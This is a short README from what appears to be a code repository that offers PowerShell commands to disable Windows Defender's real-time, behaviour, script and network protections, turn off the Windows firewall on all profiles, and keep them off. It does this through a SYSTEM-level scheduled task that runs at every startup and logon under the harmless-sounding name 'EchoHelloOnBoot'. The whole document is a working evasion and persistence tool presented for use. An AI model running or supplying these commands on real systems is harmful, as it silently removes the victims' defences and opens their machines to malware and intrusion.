# DisAVling
This is the repository that disables Windows Defender and its features on startup.

# AV disabler [disAVle.txt]
`Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -SubmitSamplesConsent 2;
Set-MpPreference -DisableArchiveScanning $true;
Set-MpPreference -DisableEmailScanning $true;
Set-MpPreference -DisableBehaviorMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;`

# Task Scheduler
`$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-Command "GET-Content -Raw C:\Users\admin\Desktop\met\DisAVle.txt | IEX"'
$Trigger1 = New-ScheduledTaskTrigger -AtStartup
$Trigger2 = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger1, $Trigger2 -Principal $Principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable)
Register-ScheduledTask -TaskName "EchoHelloOnBoot" -InputObject $Task
`
